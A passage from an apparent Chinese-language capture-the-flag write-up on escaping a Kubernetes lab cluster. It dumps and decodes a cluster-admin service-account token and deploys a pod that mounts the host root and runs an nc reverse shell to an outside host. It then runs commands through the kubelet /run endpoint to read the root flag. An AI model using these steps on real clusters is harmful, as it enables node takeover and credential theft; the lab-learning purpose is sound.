kubernetes.io/service-account-token   3      2y102d</span><br><span class="line">kube-public       default-token-c2prf                                  kubernetes.io/service-account-token   3      2y102d</span><br><span class="line">kube-node-lease   default-token-7mmh7                                  kubernetes.io/service-account-token   3      2y102d</span><br><span class="line">dev               default-token-w22lv                                  kubernetes.io/service-account-token   3      2y102d</span><br><span class="line">kube-system       c-admin-token-b47f7                                  kubernetes.io/service-account-token   3      2y102d</span><br><span class="line">kube-system       k3s-serving                                          kubernetes.io/tls                     2      408d</span><br></pre></td></tr></table></figure>

<p>看下具体哪个<code>Service Account</code>权限高一些需要看集群角色绑定，看哪个绑了<code>cluster-admin</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">└─$ k get clusterrolebindings -o wide | grep cluster-admin</span><br><span class="line">cluster-admin    ClusterRole/cluster-admin               system:masters                                 </span><br><span class="line">c-admin          ClusterRole/cluster-admin    2y102d     kube-system/c-admin</span><br></pre></td></tr></table></figure>

<p>可以看到<code>c-admin</code>token绑到了<code>cluster-admin</code>，那他的权限就到头了</p>
<p>获取<code>c-admin-token-b47f7</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">└─$ k get secret c-admin-token-b47f7 -n kube-system -o json</span><br><span class="line">&#123;</span><br><span class="line">    &quot;apiVersion&quot;: &quot;v1&quot;,</span><br><span class="line">    &quot;data&quot;: &#123;</span><br><span class="line">        &quot;ca.crt&quot;: &quot;LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUJlRENDQVIyZ0F3SUJBZ0lCQURBS0JnZ3Foa2pPUFFRREFqQWpNU0V3SHdZRFZRUUREQmhyTTNNdGMyVnkKZG1WeUxXTmhRREUyTmpFM05qVXhOekV3SGhjTk1qSXdPREk1TURreU5qRXhXaGNOTXpJd09ESTJNRGt5TmpFeApXakFqTVNFd0h3WURWUVFEREJock0zTXRjMlZ5ZG1WeUxXTmhRREUyTmpFM05qVXhOekV3V1RBVEJnY3Foa2pPClBRSUJCZ2dxaGtqT1BRTUJCd05DQUFSanpSOWNzN2tpTnRia0Z5dDJDUXR5L1JZRnZUbEFySlFDVmtCb3hyTlcKWFJkMUJnTGs3aE1WRElJZVZUZEV4aXh4VWNSTzhLK3VpMXJ5bnZUTmkzWnBvMEl3UURBT0JnTlZIUThCQWY4RQpCQU1DQXFRd0R3WURWUjBUQVFIL0JBVXdBd0VCL3pBZEJnTlZIUTRFRmdRVVpuaFRWNTd3bzk3R2lwM0Z3QSs0ClZjYnJIMUF3Q2dZSUtvWkl6ajBFQXdJRFNRQXdSZ0loQVBHN25UQzNzOWxIb0lMaVkwK2pkQldYNEFBU2c5bmYKdEFLWll0bXdna2NQQWlFQTlzSDVXeEFDcWNYYkRXY1lURlZxS2kzNlBMbDc1Zll3eG1haVhlN2RBeUk9Ci0tLS0tRU5EIENFUlRJRklDQVRFLS0tLS0K&quot;,</span><br><span class="line">        &quot;namespace&quot;: &quot;a3ViZS1zeXN0ZW0=&quot;,</span><br><span class="line">        &quot;token&quot;: &quot;ZXlKaGJHY2lPaUpTVXpJMU5pSXNJbXRwWkNJNkluUnFTRlowT1RoblpFTlZjRGg0U1hsdFRHaGZVMGhFWDNBMlVYQmhNRzAzWDJweFVWWXRNSGxyWTJjaWZRLmV5SnBjM01pT2lKcmRXSmxjbTVsZEdWekwzTmxjblpwWTJWaFkyTnZkVzUwSWl3aWEzVmlaWEp1WlhSbGN5NXBieTl6WlhKMmFXTmxZV05qYjNWdWRDOXVZVzFsYzNCaFkyVWlPaUpyZFdKbExYTjVjM1JsYlNJc0ltdDFZbVZ5Ym1WMFpYTXVhVzh2YzJWeWRtbGpaV0ZqWTI5MWJuUXZjMlZqY21WMExtNWhiV1VpT2lKakxXRmtiV2x1TFhSdmEyVnVMV0kwTjJZM0lpd2lhM1ZpWlhKdVpYUmxjeTVwYnk5elpYSjJhV05sWVdOamIzVnVkQzl6WlhKMmFXTmxMV0ZqWTI5MWJuUXVibUZ0WlNJNkltTXRZV1J0YVc0aUxDSnJkV0psY201bGRHVnpMbWx2TDNObGNuWnBZMlZoWTJOdmRXNTBMM05sY25acFkyVXRZV05qYjNWdWRDNTFhV1FpT2lJek1UYzNPR1F4TnkwNU1EaGtMVFJsWXpNdE9UQTFPQzB4WlRVeU16RTRNR0l4TkdNaUxDSnpkV0lpT2lKemVYTjBaVzA2YzJWeWRtbGpaV0ZqWTI5MWJuUTZhM1ZpWlMxemVYTjBaVzA2WXkxaFpHMXBiaUo5LmZrYV9VVWNlSUpBbzN4bUZsOFJYbmNXRXNaQzNXVVJPdzV4NmRtZ1FoXzgxZWFtMXh5eHFfaWxJejZDajZIN3Y1QmpjZ0lpd3NXVTl1MTN2ZVk2ZEZFck9zZjFJMTBuQURxWkQ2NlZRMjRJNlRMcUZhc1RwblJIR19leldLOFV1WHJaY0hCdTRIcmloNExBYTJycE9SbTh4UkF1TlZFbWliWU5HaGpfUE5lWjZFV1FKdzduODdsaXIybFljcUdFWTExa1hCUlNpbFJVMWdOaFdibktvS1JlR19PVGhpUzVjQ28yZHM4S0RYNkJad3hFcGZXNEE3ZktDLVNkTFlRcTZfaTJFemtWb0JnOFZrMk1sY0doTi0wX3VlcnI2clBiU2k5ZmFRTm9LT1pCWVlmVkhHR00zUURDQWszRHUtWXRCeWxvQkNmVHc4WHlsRzlFdVRndGdaQQ==&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;kind&quot;: &quot;Secret&quot;,</span><br><span class="line">    &quot;metadata&quot;: &#123;</span><br><span class="line">        &quot;annotations&quot;: &#123;</span><br><span class="line">            &quot;kubernetes.io/service-account.name&quot;: &quot;c-admin&quot;,</span><br><span class="line">            &quot;kubernetes.io/service-account.uid&quot;: &quot;31778d17-908d-4ec3-9058-1e523180b14c&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;creationTimestamp&quot;: &quot;2022-08-29T09:32:33Z&quot;,</span><br><span class="line">        &quot;managedFields&quot;: [</span><br><span class="line">            &#123;</span><br><span class="line">                &quot;apiVersion&quot;: &quot;v1&quot;,</span><br><span class="line">                &quot;fieldsType&quot;: &quot;FieldsV1&quot;,</span><br><span class="line">                &quot;fieldsV1&quot;: &#123;</span><br><span class="line">                    &quot;f:data&quot;: &#123;</span><br><span class="line">                        &quot;.&quot;: &#123;&#125;,</span><br><span class="line">                        &quot;f:ca.crt&quot;: &#123;&#125;,</span><br><span class="line">                        &quot;f:namespace&quot;: &#123;&#125;,</span><br><span class="line">                        &quot;f:token&quot;: &#123;&#125;</span><br><span class="line">                    &#125;,</span><br><span class="line">                    &quot;f:metadata&quot;: &#123;</span><br><span class="line">                        &quot;f:annotations&quot;: &#123;</span><br><span class="line">                            &quot;.&quot;: &#123;&#125;,</span><br><span class="line">                            &quot;f:kubernetes.io/service-account.name&quot;: &#123;&#125;,</span><br><span class="line">                            &quot;f:kubernetes.io/service-account.uid&quot;: &#123;&#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;,</span><br><span class="line">                    &quot;f:type&quot;: &#123;&#125;</span><br><span class="line">                &#125;,</span><br><span class="line">                &quot;manager&quot;: &quot;k3s&quot;,</span><br><span class="line">                &quot;operation&quot;: &quot;Update&quot;,</span><br><span class="line">                &quot;time&quot;: &quot;2022-08-29T09:32:33Z&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        ],</span><br><span class="line">        &quot;name&quot;: &quot;c-admin-token-b47f7&quot;,</span><br><span class="line">        &quot;namespace&quot;: &quot;kube-system&quot;,</span><br><span class="line">        &quot;resourceVersion&quot;: &quot;707&quot;,</span><br><span class="line">        &quot;uid&quot;: &quot;7778ef55-db34-406d-b256-1704ec78236e&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;type&quot;: &quot;kubernetes.io/service-account-token&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>替换token</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">└─$ echo &#x27;ZXlKaGJHY2lPaUpTVXpJMU5pSXNJbXRwWkNJNkluUnFTRlowT1RoblpFTlZjRGg0U1hsdFRHaGZVMGhFWDNBMlVYQmhNRzAzWDJweFVWWXRNSGxyWTJjaWZRLmV5SnBjM01pT2lKcmRXSmxjbTVsZEdWekwzTmxjblpwWTJWaFkyTnZkVzUwSWl3aWEzVmlaWEp1WlhSbGN5NXBieTl6WlhKMmFXTmxZV05qYjNWdWRDOXVZVzFsYzNCaFkyVWlPaUpyZFdKbExYTjVjM1JsYlNJc0ltdDFZbVZ5Ym1WMFpYTXVhVzh2YzJWeWRtbGpaV0ZqWTI5MWJuUXZjMlZqY21WMExtNWhiV1VpT2lKakxXRmtiV2x1TFhSdmEyVnVMV0kwTjJZM0lpd2lhM1ZpWlhKdVpYUmxjeTVwYnk5elpYSjJhV05sWVdOamIzVnVkQzl6WlhKMmFXTmxMV0ZqWTI5MWJuUXVibUZ0WlNJNkltTXRZV1J0YVc0aUxDSnJkV0psY201bGRHVnpMbWx2TDNObGNuWnBZMlZoWTJOdmRXNTBMM05sY25acFkyVXRZV05qYjNWdWRDNTFhV1FpT2lJek1UYzNPR1F4TnkwNU1EaGtMVFJsWXpNdE9UQTFPQzB4WlRVeU16RTRNR0l4TkdNaUxDSnpkV0lpT2lKemVYTjBaVzA2YzJWeWRtbGpaV0ZqWTI5MWJuUTZhM1ZpWlMxemVYTjBaVzA2WXkxaFpHMXBiaUo5LmZrYV9VVWNlSUpBbzN4bUZsOFJYbmNXRXNaQzNXVVJPdzV4NmRtZ1FoXzgxZWFtMXh5eHFfaWxJejZDajZIN3Y1QmpjZ0lpd3NXVTl1MTN2ZVk2ZEZFck9zZjFJMTBuQURxWkQ2NlZRMjRJNlRMcUZhc1RwblJIR19leldLOFV1WHJaY0hCdTRIcmloNExBYTJycE9SbTh4UkF1TlZFbWliWU5HaGpfUE5lWjZFV1FKdzduODdsaXIybFljcUdFWTExa1hCUlNpbFJVMWdOaFdibktvS1JlR19PVGhpUzVjQ28yZHM4S0RYNkJad3hFcGZXNEE3ZktDLVNkTFlRcTZfaTJFemtWb0JnOFZrMk1sY0doTi0wX3VlcnI2clBiU2k5ZmFRTm9LT1pCWVlmVkhHR00zUURDQWszRHUtWXRCeWxvQkNmVHc4WHlsRzlFdVRndGdaQQ==&#x27;|base64 -d &gt; token_admin</span><br></pre></td></tr></table></figure>

<p>再一次查看权限</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line">└─$ curl --cacert ca.crt  --header &quot;Authorization: Bearer $(cat token_admin )&quot; -i -s -k -X $&#x27;POST&#x27; \</span><br><span class="line">    -H $&#x27;Content-Type: application/json&#x27; \</span><br><span class="line">    --data-binary $&#x27;&#123;\&quot;kind\&quot;:\&quot;SelfSubjectRulesReview\&quot;,\&quot;apiVersion\&quot;:\&quot;authorization.k8s.io/v1\&quot;,\&quot;metadata\&quot;:&#123;\&quot;creationTimestamp\&quot;:null&#125;,\&quot;spec\&quot;:&#123;\&quot;namespace\&quot;:\&quot;kube-system\&quot;&#125;,\&quot;status\&quot;:&#123;\&quot;resourceRules\&quot;:null,\&quot;nonResourceRules\&quot;:null,\&quot;incomplete\&quot;:false&#125;&#125;\x0a&#x27; \</span><br><span class="line">    &quot;https://10.10.10.235:8443/apis/authorization.k8s.io/v1/selfsubjectrulesreviews&quot;</span><br><span class="line">HTTP/1.1 201 Created</span><br><span class="line">Audit-Id: 88f46eb3-acb2-4d6e-99c9-18b9344b64e0</span><br><span class="line">Cache-Control: no-cache, private</span><br><span class="line">Content-Type: application/json</span><br><span class="line">X-Kubernetes-Pf-Flowschema-Uid: 3bc23af6-1f53-44dc-b16a-29214ba5d61c</span><br><span class="line">X-Kubernetes-Pf-Prioritylevel-Uid: 52874081-dd33-48e6-9b8c-6ad0f2e56708</span><br><span class="line">Date: Mon, 09 Dec 2024 08:39:03 GMT</span><br><span class="line">Content-Length: 1487</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;kind&quot;: &quot;SelfSubjectRulesReview&quot;,</span><br><span class="line">  &quot;apiVersion&quot;: &quot;authorization.k8s.io/v1&quot;,</span><br><span class="line">  &quot;metadata&quot;: &#123;</span><br><span class="line">    &quot;creationTimestamp&quot;: null</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;spec&quot;: &#123;</span><br><span class="line">    </span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;status&quot;: &#123;</span><br><span class="line">    &quot;resourceRules&quot;: [</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;verbs&quot;: [</span><br><span class="line">          &quot;*&quot;</span><br><span class="line">        ],</span><br><span class="line">        &quot;apiGroups&quot;: [</span><br><span class="line">          &quot;*&quot;</span><br><span class="line">        ],</span><br><span class="line">        &quot;resources&quot;: [</span><br><span class="line">          &quot;*&quot;</span><br><span class="line">        ]</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;verbs&quot;: [</span><br><span class="line">          &quot;create&quot;</span><br><span class="line">        ],</span><br><span class="line">        &quot;apiGroups&quot;: [</span><br><span class="line">          &quot;authorization.k8s.io&quot;</span><br><span class="line">        ],</span><br><span class="line">        &quot;resources&quot;: [</span><br><span class="line">          &quot;selfsubjectaccessreviews&quot;,</span><br><span class="line">          &quot;selfsubjectrulesreviews&quot;</span><br><span class="line">        ]</span><br><span class="line">      &#125;</span><br><span class="line">    ],</span><br><span class="line">    &quot;nonResourceRules&quot;: [</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;verbs&quot;: [</span><br><span class="line">          &quot;*&quot;</span><br><span class="line">        ],</span><br><span class="line">        &quot;nonResourceURLs&quot;: [</span><br><span class="line">          &quot;*&quot;</span><br><span class="line">        ]</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;verbs&quot;: [</span><br><span class="line">          &quot;get&quot;</span><br><span class="line">        ],</span><br><span class="line">        &quot;nonResourceURLs&quot;: [</span><br><span class="line">          &quot;/.well-known/openid-configuration&quot;,</span><br><span class="line">          &quot;/openid/v1/jwks&quot;</span><br><span class="line">        ]</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;verbs&quot;: [</span><br><span class="line">          &quot;get&quot;</span><br><span class="line">        ],</span><br><span class="line">        &quot;nonResourceURLs&quot;: [</span><br><span class="line">          &quot;/api&quot;,</span><br><span class="line">          &quot;/api/*&quot;,</span><br><span class="line">          &quot;/apis&quot;,</span><br><span class="line">          &quot;/apis/*&quot;,</span><br><span class="line">          &quot;/healthz&quot;,</span><br><span class="line">          &quot;/livez&quot;,</span><br><span class="line">          &quot;/openapi&quot;,</span><br><span class="line">          &quot;/openapi/*&quot;,</span><br><span class="line">          &quot;/readyz&quot;,</span><br><span class="line">          &quot;/version&quot;,</span><br><span class="line">          &quot;/version/&quot;</span><br><span class="line">        ]</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;verbs&quot;: [</span><br><span class="line">          &quot;get&quot;</span><br><span class="line">        ],</span><br><span class="line">        &quot;nonResourceURLs&quot;: [</span><br><span class="line">          &quot;/healthz&quot;,</span><br><span class="line">          &quot;/livez&quot;,</span><br><span class="line">          &quot;/readyz&quot;,</span><br><span class="line">          &quot;/version&quot;,</span><br><span class="line">          &quot;/version/&quot;</span><br><span class="line">        ]</span><br><span class="line">      &#125;</span><br><span class="line">    ],</span><br><span class="line">    &quot;incomplete&quot;: false</span><br><span class="line">  &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>可以看到我们当前的权限变成了<code>*</code>，可以为所欲为，这里还是用常规<code>pod</code>创建的<code>volume</code>挂载的方式进行逃逸</p>
<p>查一下能用的<code>images</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">└─$ curl --cacert ca.crt  --header &quot;Authorization: Bearer $(cat token_admin)&quot; -s -k https://10.10.10.235:8443/api/v1/pods|grep &#x27;&quot;image&quot;&#x27;|sort -u</span><br><span class="line">            &quot;image&quot;: &quot;alpine:latest&quot;,</span><br><span class="line">            &quot;image&quot;: &quot;localhost:5000/dev-alpine&quot;,</span><br><span class="line">            &quot;image&quot;: &quot;localhost:5000/node_server&quot;,</span><br><span class="line">            &quot;image&quot;: &quot;localhost:5000/node_server:latest&quot;,</span><br><span class="line">            &quot;image&quot;: &quot;rancher/local-path-provisioner:v0.0.21&quot;,</span><br><span class="line">            &quot;image&quot;: &quot;rancher/mirrored-coredns-coredns:1.8.6&quot;,</span><br><span class="line">            &quot;image&quot;: &quot;rancher/mirrored-metrics-server:v0.5.2&quot;,</span><br></pre></td></tr></table></figure>

<p>创建一个模板</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">k run new-pod --image=&#x27;localhost:5000/dev-alpine&#x27; --dry-run=client -o yaml &gt; new-pod.yaml</span><br></pre></td></tr></table></figure>

<p>然后改一下，这里8443通过sleep的方式再用exec需要ws，所以这里我会用其他两种方式来演示恶意pod的revshell</p>
<p>首先是command直接弹shell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">└─$ cat my-pod.yaml </span><br><span class="line">apiVersion: v1</span><br><span class="line">kind: Pod</span><br><span class="line">metadata:</span><br><span class="line">  creationTimestamp: null</span><br><span class="line">  labels:</span><br><span class="line">    run: new-pod</span><br><span class="line">  name: new-pod</span><br><span class="line">  namespace: kube-system</span><br><span class="line">spec:</span><br><span class="line">  containers:</span><br><span class="line">  - image: localhost:5000/dev-alpine</span><br><span class="line">    name: new-pod-1</span><br><span class="line">    command: [&quot;/bin/sh&quot;,&quot;-c&quot;,&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.16.9 10086 &gt;/tmp/f&quot;]</span><br><span class="line">    volumeMounts:</span><br><span class="line">    - name: test</span><br><span class="line">      mountPath: /a</span><br><span class="line">  volumes:</span><br><span class="line">  - name: test</span><br><span class="line">    hostPath:</span><br><span class="line">      path: /</span><br><span class="line">  dnsPolicy: ClusterFirst</span><br><span class="line">  restartPolicy: Always</span><br><span class="line">status: &#123;&#125;</span><br></pre></td></tr></table></figure>

<p>这种提前开好nc直接接shell就ok 这里不赘述</p>
<p>创建一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">─$ k apply -f my-pod.yaml            </span><br><span class="line">pod/my-pod created</span><br></pre></td></tr></table></figure>

<p>查看状态</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">└─$ k get -n kube-system pods                                                                                       </span><br><span class="line">NAME                                      READY   STATUS             RESTARTS        AGE</span><br><span class="line">coredns-96cc4f57d-hjgsw                   1/1     Running            6 (408d ago)    2y102d</span><br><span class="line">local-path-provisioner-84bb864455-2jcqr   1/1     Running            10 (408d ago)   2y102d</span><br><span class="line">metrics-server-ff9dbcb6c-5sg5s            1/1     Running            7 (408d ago)    2y102d</span><br><span class="line">my-pod                                    1/1     Running            0               64s</span><br><span class="line">backup-pod                                0/1     CrashLoopBackOff   241 (24s ago)   2y102d</span><br></pre></td></tr></table></figure>


<p>而后是<code>10250</code>的<code>/run</code>执行命令的方式</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">─$ curl -XPOST https://10.10.10.235:10250/run/kube-system/new-pod/new-pod-1 -d &#x27;cmd=cat /a/root/root.txt&#x27; -k  -H &quot;Authorization: Bearer $(cat token_admin)&quot;   --cacert ./ca.crt </span><br><span class="line">xxxx</span><br></pre></td></tr></table></figure>

<p>在<code>steamcloud</code>中我没有记录</p>
<p>这个<code>/run</code>其实是在</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/kubernetes/kubernetes/blob/release-1.30/pkg/kubelet/server/server.go">https://github.com/kubernetes/kubernetes/blob/release-1.30/pkg/kubelet/server/server.go</a></p>
</blockquote>
<p>下面这个部分定义</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *Server)</span></span> getRun(request *restful.Request, response *restful.Response) &#123;</span><br><span class="line">	params := getExecRequestParams(request)</span><br><span class="line">	pod, ok := s.host.GetPodByName(params.podNamespace, params.podName)</span><br><span class="line">	<span class="keyword">if</span> !ok &#123;</span><br><span class="line">		response.WriteError(http.StatusNotFound, fmt.Errorf(<span class="string">&quot;pod does not exist&quot;</span>))</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// For legacy reasons, run uses different query param than exec.</span></span><br><span class="line">	params.cmd = strings.Split(request.QueryParameter(<span class="string">&quot;cmd&quot;</span>), <span class="string">&quot; &quot;</span>)</span><br><span class="line">	data, err := s.host.RunInContainer(request.Request.Context(), kubecontainer.GetPodFullName(pod), params.podUID, params.containerName, params.cmd)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		response.WriteError(http.StatusInternalServerError, err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	writeJSONResponse(response, data)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>他在这里被调用，可以看到她下面就是<code>/exec</code></p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *Server)</span></span> InstallDebuggingHandlers() &#123;</span><br><span class="line">	klog.InfoS(<span class="string">&quot;Adding debug handlers to kubelet server&quot;</span>)</span><br><span class="line"></span><br><span class="line">	s.addMetricsBucketMatcher(<span class="string">&quot;run&quot;</span>)</span><br><span class="line">	ws := <span class="built_in">new</span>(restful.WebService)</span><br><span class="line">	ws.</span><br><span class="line">		Path(<span class="string">&quot;/run&quot;</span>)</span><br><span class="line">	ws.Route(ws.POST(<span class="string">&quot;/&#123;podNamespace&#125;/&#123;podID&#125;/&#123;containerName&#125;&quot;</span>).</span><br><span class="line">		To(s.getRun).</span><br><span class="line">		Operation(<span class="string">&quot;getRun&quot;</span>))</span><br><span class="line">	ws.Route(ws.POST(<span class="string">&quot;/&#123;podNamespace&#125;/&#123;podID&#125;/&#123;uid&#125;/&#123;containerName&#125;&quot;</span>).</span><br><span class="line">		To(s.getRun).</span><br><span class="line">		Operation(<span class="string">&quot;getRun&quot;</span>))</span><br><span class="line">	s.restfulCont.Add(ws)</span><br><span class="line"></span><br><span class="line">	s.addMetricsBucketMatcher(<span class="string">&quot;exec&quot;</span>)</span><br><span class="line">	ws = <span class="built_in">new</span>(restful.WebService)</span><br><span class="line">	ws.</span><br><span class="line">		Path(<span class="string">&quot;/exec&quot;</span>)</span><br><span class="line">	ws.Route(ws.GET(<span class="string">&quot;/&#123;podNamespace&#125;/&#123;podID&#125;/&#123;containerName&#125;&quot;</span>).</span><br><span class="line">		To(s.getExec).</span><br><span class="line">		Operation(<span class="string">&quot;getExec&quot;</span>))</span><br><span class="line">	ws.Route(ws.POST(<span class="string">&quot;/&#123;podNamespace&#125;/&#123;podID&#125;/&#123;containerName&#125;&quot;</span>).</span><br><span class="line">		To(s.getExec).</span><br><span class="line">		Operation(<span class="string">&quot;getExec&quot;</span>))</span><br><span class="line">	ws.Route(ws.GET(<span class="string">&quot;/&#123;podNamespace&#125;/&#123;podID&#125;/&#123;uid&#125;/&#123;containerName&#125;&quot;</span>).</span><br><span class="line">		To(s.getExec).</span><br><span class="line">		Operation(<span class="string">&quot;getExec&quot;</span>))</span><br><span class="line">	ws.Route(ws.POST(<span class="string">&quot;/&#123;podNamespace&#125;/&#123;podID&#125;/&#123;uid&#125;/&#123;containerName&#125;&quot;</span>).</span><br><span class="line">		To(s.getExec).</span><br><span class="line">		Operation(<span class="string">&quot;getExec&quot;</span>))</span><br><span class="line">	s.restfulCont.Add(ws)</span><br></pre></td></tr></table></figure>
        
      </div>

         
    </div>
    
     
  </div>
  
    
<nav id="article-nav">
  <a class="article-nav-btn left "
    
      href="/2024/12/12/Tracks-AD-Rebound/"
